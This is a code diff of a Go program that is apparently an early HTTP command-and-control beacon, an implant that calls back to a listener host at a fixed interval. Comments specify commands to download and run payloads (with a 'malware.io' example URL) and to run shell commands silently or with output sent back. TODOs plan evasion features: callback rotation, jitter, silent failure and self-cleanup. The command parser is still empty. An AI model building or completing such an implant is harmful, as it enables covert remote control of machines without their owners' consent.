@@ -1,14 +1,19 @@
 package main
 
-import "time"
-import "flag"
-import "os"
-import "net/http"
-import "fmt" // TODO: Implement a pre-processor / build script which will strip out this import and all print lines (and anything that refers to DebugMode)
-import "strconv"
-import "io/ioutil"
+import (
+	"fmt" // TODO: Implement a pre-processor / build script which will strip out this import and all print lines (and anything that refers to DebugMode)
+	"flag"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strconv"
+	"time"
+)
 
+// TODO: Get rid of this
 const DebugMode = true
+
+// TODO: Add support for callback rotation (using different domain names, IP's, and/or ports)
 
 // TODO: Use ldflags instead of command line flags when compiling the binary: go build -o merlinagent.exe -ldflags "-X main.url=https://acme.com:443/" cmd/merlinagent/main.go
 
@@ -24,19 +29,17 @@ const DebugMode = true
 TODO: Figure out the cross-compilation stuff; the -s flag also helps shrink the binary size.
 */
 
-// TODO: Move this into Serpent
 /*
 
 
 Beacon Action Request Format:
 
-ACTION
-DETAILS
+[ACTION] [DETAILS]
 
 Examples:
 
 GET http://malware.io/new_payload.malware
-EXECUTE <SHELL COMMAND>
+EXECUTE [SHELL COMMAND]
 
 ""
 
@@ -46,37 +49,40 @@ Supported Actions:
 * RUN [url:URL | file:<LOCAL FILE LOCATION>]: Have the beacon run the specified payload (will first download the payload if a URL is provided)
 * EXECUTE [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s) and send the output back
 * EXECUTE_SILENT [SYSTEM COMMAND TO EXECUTE]: Will execute the specified system / shell command(s), but will *not* send the output back
-* CONFIGURE []
-
- */
+* CONFIGURE [CONFIGURATION NAME] [CONFIGURATION VALUE]: Change configuration value
+*/
 func parse_response_body(body string) {
-	
+
+}
+
+var dstPort = 9090
+var dstHost = "" // Can be an IP or hostname, but must be provided
+var clientToken = "" // Unique string to identify this beacon. Must be provided.
+var callbackInterval = 300 // TODO: Add support for enabling randomized jitter on callback time
+
+func init() {
+	// flag.IntVar(&dstPort, "dstPort", 9090, "Set the port to call back to; defaults to port 9090")
+	// flag.StringVar(&dstHost, "dstHost", "", "The host to callback to. Can be either an IP address or a hostname. Required value.")
+	// flag.StringVar(&clientToken, "clientToken", "", "Unique string to identify this beacon. Required value.")
+	// flag.IntVar(&callbackInterval, "callbackInterval", 300, "How often to callback to the server (in seconds); default is to callback once every 300 seconds (5 minutes).")
+
+	// If required ldflags (load flags) are not provided, simply exit silently
+	if dstHost == "" || clientToken == "" {
+		//fmt.Println("\nUSAGE: simple_http_beacon -dst='<listener host>' -port=<dst port> -token='<unique ID token>' -sleep=<time between callbacks in seconds>\n")
+		os.Exit(0)
+	}
 }
 
 // TODO: Add in event handling loop for handling calls from C2 -> the beacon
 func main() {
 	// TODO: Catch any errors and fail silently / do self-cleanup
 
-	dstHostPtr := flag.String("dst", "", "The IP or hostname for the remote listener host")
-	dstPortPtr := flag.Int("port", 80, "Destination port; defaults to calling out to port 80")
-	clientTokenPtr := flag.String("token", "", "Unique token for identifying this beacon")
-	callbackInterval := flag.Int("sleep", 300, "Number of seconds the beacon should sleep before calling back (default is 300 seconds [5 minutes])")
-
-	flag.Parse()
-
-	if *dstHostPtr == "" || *clientTokenPtr == "" {
-		if DebugMode {
-			fmt.Println("\nUSAGE: simple_http_beacon -dst='<listener host>' -port=<dst port> -token='<unique ID token>' -sleep=<time between callbacks in seconds>\n")
-		}
-		
-		os.Exit(0)
-	}
-
+	// TODO: Remove all debug statements
 	if DebugMode {
-		fmt.Println("Starting beacon with sleep interval of", *callbackInterval, "...")
+		fmt.Println("Starting beacon with sleep interval of ", strconv.Itoa(callbackInterval), "...")
 	}
-	
-	dst_url := "http://" + *dstHostPtr + ":" + strconv.Itoa(*dstPortPtr) + "/" + *clientTokenPtr
+
+	dst_url := "http://" + dstHost + ":" + strconv.Itoa(dstPort) + "/" + clientToken
 
 	if DebugMode {
 		fmt.Println("DST URL:", dst_url)
@@ -104,6 +110,6 @@ func main() {
 			fmt.Println("ERROR:", err)
 		}
 
-		time.Sleep(time.Duration(*callbackInterval) * time.Second)
+		time.Sleep(time.Duration(callbackInterval) * time.Second)
 	}
 }
